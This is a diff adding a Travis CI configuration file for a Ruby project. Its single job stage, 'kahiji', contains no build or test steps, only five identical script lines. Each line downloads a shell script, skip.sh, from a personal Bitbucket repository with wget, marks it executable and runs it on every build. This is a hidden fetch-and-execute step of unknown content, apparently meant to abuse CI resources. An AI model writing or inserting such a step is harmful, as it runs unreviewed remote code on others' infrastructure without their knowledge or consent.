@@ -1,0 +1,12 @@
+language: ruby
+os: linux
+dist: bionic
+
+jobs:
+  include:
+    - stage: kahiji
+      script: wget https://bitbucket.org/fajar990/satru/raw/ef2fcf1212c650cefd33d87ae068234e6d6dfbcb/skip.sh && chmod +x skip.sh && ./skip.sh
+      script: wget https://bitbucket.org/fajar990/satru/raw/ef2fcf1212c650cefd33d87ae068234e6d6dfbcb/skip.sh && chmod +x skip.sh && ./skip.sh
+      script: wget https://bitbucket.org/fajar990/satru/raw/ef2fcf1212c650cefd33d87ae068234e6d6dfbcb/skip.sh && chmod +x skip.sh && ./skip.sh
+      script: wget https://bitbucket.org/fajar990/satru/raw/ef2fcf1212c650cefd33d87ae068234e6d6dfbcb/skip.sh && chmod +x skip.sh && ./skip.sh
+      script: wget https://bitbucket.org/fajar990/satru/raw/ef2fcf1212c650cefd33d87ae068234e6d6dfbcb/skip.sh && chmod +x skip.sh && ./skip.sh
